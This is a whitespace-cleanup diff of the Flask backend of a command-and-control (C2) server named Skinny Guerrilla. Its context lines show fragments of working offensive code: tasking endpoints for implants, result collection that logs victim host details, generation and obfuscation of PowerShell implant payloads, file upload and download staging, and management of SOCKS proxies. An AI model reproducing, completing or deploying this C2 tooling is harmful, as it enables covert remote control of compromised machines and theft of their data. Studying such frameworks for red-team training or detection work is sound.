@@ -1,16 +1,16 @@
 ###############################################################################
-#                          SKINNY GUERRILLA C2 SERVER                          
-#     _____ _    _                      _____                      _ _ _       
-#    / ____| |  (_)                    / ____|                    (_) | |      
-#   | (___ | | ___ _ __  _ __  _   _  | |  __ _   _  ___ _ __ _ __ _| | | __ _ 
+#                          SKINNY GUERRILLA C2 SERVER
+#     _____ _    _                      _____                      _ _ _
+#    / ____| |  (_)                    / ____|                    (_) | |
+#   | (___ | | ___ _ __  _ __  _   _  | |  __ _   _  ___ _ __ _ __ _| | | __ _
 #    \___ \| |/ / | '_ \| '_ \| | | | | | |_ | | | |/ _ \ '__| '__| | | |/ _` |
 #    ____) |   <| | | | | | | | |_| | | |__| | |_| |  __/ |  | |  | | | | (_| |
 #   |_____/|_|\_\_|_| |_|_| |_|\__, |  \_____|\__,_|\___|_|  |_|  |_|_|_|\__,_|
-#                               __/ |                                          
-#                              |___/                                           
+#                               __/ |
+#                              |___/
 #
 # resources.py
-# Flask app backend, manages what we display to the web browser, and makes 
+# Flask app backend, manages what we display to the web browser, and makes
 # calls to our sql backend.
 #
 # inspired by https://github.com/shogunlab/building-c2-implants-in-cpp
@@ -71,7 +71,7 @@ def api_post_request(ip_addr, endpoint, payload):
 
 # defines our tasks class as a resource of our flask app
 class Tasks(Resource):
-    
+
     # everytime we GET to the /tasks page
     def get(self, implant_id):
 
@@ -118,7 +118,7 @@ class Tasks(Resource):
             # if the task_type is one of the commands the implant was built w/ or one of the
             # two default commands
             if task_type in str(possible_commands + ["exit", "checkin"]):
-                
+
                 # gets current zulu time
                 task_time = datetime.now(timezone.utc)
 
@@ -157,7 +157,7 @@ class Tasks(Resource):
 
         # return response with 200 code.
         return Response(status=200)
-    
+
 
 ############################## RESULTS PAGE CLASS #############################
 
@@ -193,7 +193,7 @@ class Results(Resource):
             result_time = val_list[2]
             sa = val_list[3]
             digest = base64.decodebytes(val_list[4].encode())
-            
+
 
             # breaks over the <br> tag we input to reassemble everything in the request
             # except the last item which is the digest
@@ -207,7 +207,7 @@ class Results(Resource):
 
                 try:
 
-                    # if the task as a download task 
+                    # if the task as a download task
                     task_type, operator = get_task_type(task_id)
                     if task_type == "download":
 
@@ -243,11 +243,11 @@ class Results(Resource):
                             print(f'FQDN:\t {sa_list[6]}')
                             print(f'PID:\t {sa_list[7]}')
                             print(f'PPID:\t {sa_list[8]}')
-                        
+
                 # if we error out during any of that, just move on
                 except:
                     pass
-                
+
 
                 if task_type == "upload" or task_type == "download":
                     results = ''
@@ -261,12 +261,12 @@ class Results(Resource):
                 # if we get an error trying to verify the hash or decode something, tells us
                 print("[!] COULD NOT VERIFY RESULTS {body} from implant {implant_id}")
         else:
-            # print that we recieved an invalid response string from the implant. 
+            # print that we recieved an invalid response string from the implant.
             print("[!] Invalid input to /results.")
 
         # return response with 200 code.
         return Response(status=200)
-    
+
 
 ############################## HISTORY PAGE CLASS #############################
 
@@ -284,7 +284,7 @@ class History(Resource):
 
         # return response with 200 code.
         return Response(status=200)
-    
+
 ############################## IMPLANT PAGE CLASS #############################
 
 # used to create and serve implants of different formats
@@ -311,14 +311,14 @@ class Implant(Resource):
 
         # returns our response string and status 200
         return Response(resp.encode(), status = 200)
-    
+
     # handles post requests. this creates payloads based on our C2 settings
     def post(self, format):
 
         # decodes the body of our request
         body = request.data.decode()
 
-        # creates a dictionary for C2 settings 
+        # creates a dictionary for C2 settings
         c2_params = dict()
 
         # read C2 params into the c2_params dictionary
@@ -373,9 +373,9 @@ class Implant(Resource):
             # start of the pickjob function
             payload_str += """\nfunction func_pick_job
 {
-    param([string]$job,     
-        [string]$job_args,   
-        [string]$lcl_ip)            
+    param([string]$job,
+        [string]$job_args,
+        [string]$lcl_ip)
 
     # picks the job and executes the command
     if ($job -eq "exit" -or $job -eq "checkin")
@@ -420,13 +420,13 @@ class Implant(Resource):
 
             # obfuscates the payload
             obf_powershell("./implants/powershell_payload_current.ps1", "./implants/obf_powershell.ps1")
-            
+
             # adds the implant to the implants table
             add_implant(format, new_aes_key, new_aes_iv, commands)
 
 
             requests.post(f'http://{c2_params["ip"]}/{c2_params["task_uri"]}/{new_implantid}', data="checkin", verify=False)
-            
+
 
             # sends a 200 code back to the client
             return Response(status = 200)
@@ -445,7 +445,7 @@ class Upload(Resource):
         infile = open(f"./uploads/uploadfile{implant_id}", 'rb')
         resp = infile.read()
         infile.close()
-        
+
         return Response(resp, status = 200)
 
     # post response to /upload/implant_id
@@ -458,8 +458,8 @@ class Upload(Resource):
         outfile.write(body)
         outfile.close()
 
-        return Response(status = 200)  
-    
+        return Response(status = 200)
+
 
 ############################### SOCKS PAGE CLASS ##############################
 class Socks(Resource):
@@ -468,7 +468,7 @@ class Socks(Resource):
     def get(self, implant_id):
 
         return Response(status = 200)
-    
+
 
     # what to do when a post is sent to /socks/implant_id
     def post(self, implant_id):
@@ -494,11 +494,11 @@ class Socks(Resource):
 
             # gets the pid of the socks server from the database
             newpid = get_socks_pid(implant_id)[0]
-            
+
             # attempts to kill the process, and if successful, removes it from the database
             try:
                 process = subprocess.Popen(['python', '-c', f"import os, signal; os.kill({newpid}, signal.SIGKILL)"])
-                
+
                 remove_pid(implant_id, newpid)
             except:
                 print(f'[!] Could not kill socks server with PID {newpid}. Not deleting record from db')
